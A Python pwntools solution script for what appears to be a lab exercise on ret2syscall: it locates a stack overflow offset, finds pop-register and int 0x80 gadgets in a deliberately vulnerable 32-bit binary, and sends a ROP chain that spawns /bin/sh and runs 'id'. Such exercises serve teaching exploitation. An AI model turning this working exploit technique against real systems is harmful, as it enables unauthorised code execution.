#!/usr/bin/env python3
"""Solution for Problem 4 (ret2syscall): pure-ROP execve via int 0x80.

No libc function is called at all. We chain `pop reg; ret` gadgets to load the
syscall registers, then fire `int 0x80` to run execve("/bin/sh", NULL, NULL):

    eax = 11 (__NR_execve)   ebx = &"/bin/sh"   ecx = 0   edx = 0

    [pop eax;ret][11][pop ebx;ret][&binsh][pop ecx;ret][0][pop edx;ret][0][int 0x80]

Gadget addresses are found by searching the binary's bytes, so this works
whether they come from the gadget farm or anywhere else in the code. ASLR off.

Run:  cd example5 && make && python3 solution5/solve_ret2syscall.py
"""
import os
from pwn import *

context.update(arch="i386", os="linux", log_level="info")

HERE = os.path.dirname(os.path.abspath(__file__))


def runnable(path):
    """/vagrant vboxsf flakily drops the +x bit; always run from an ext4 copy."""
    import shutil, tempfile
    dst = os.path.join(tempfile.mkdtemp(), os.path.basename(path))
    shutil.copy(path, dst)
    os.chmod(dst, 0o755)
    return dst


BIN = runnable(os.path.join(HERE, "..", "ret2syscall"))
elf = ELF(BIN, checksec=False)


def find_offset():
    io = process(BIN)
    io.sendline(cyclic(200))
    io.wait()
    off = cyclic_find(io.corefile.eip)
    io.close()
    log.success("offset = %d", off)
    return off


def g(asm_str):
    """Address of a gadget by its exact byte encoding."""
    return next(elf.search(asm(asm_str)))


def main():
    offset = find_offset()

    pop_eax = g("pop eax; ret")
    pop_ebx = g("pop ebx; ret")
    pop_ecx = g("pop ecx; ret")
    pop_edx = g("pop edx; ret")
    int80 = next(elf.search(asm("int 0x80")))
    binsh = elf.symbols["binsh"]
    log.info("pop eax@%#x ebx@%#x ecx@%#x edx@%#x  int0x80@%#x  /bin/sh@%#x",
             pop_eax, pop_ebx, pop_ecx, pop_edx, int80, binsh)

    chain = flat(
        pop_eax, 0xb,            # eax = __NR_execve
        pop_ebx, binsh,          # ebx = "/bin/sh"
        pop_ecx, 0,              # ecx = argv = NULL
        pop_edx, 0,              # edx = envp = NULL
        int80,                   # execve("/bin/sh", NULL, NULL)
    )
    payload = flat(b"A" * offset, chain)

    io = process(BIN)
    io.recvuntil(b"rop me:\n")
    io.sendline(payload)
    log.success("int 0x80 execve(\"/bin/sh\") -- dropping a shell")
    # execve ran with envp = NULL, so the shell inherited no $PATH; set one so
    # external tools like `id` resolve. Shell builtins (echo, cd) work already.
    io.sendline(b"export PATH=/usr/bin:/bin:/usr/sbin:/sbin; id; echo PWNED")
    io.interactive()


if __name__ == "__main__":
    main()
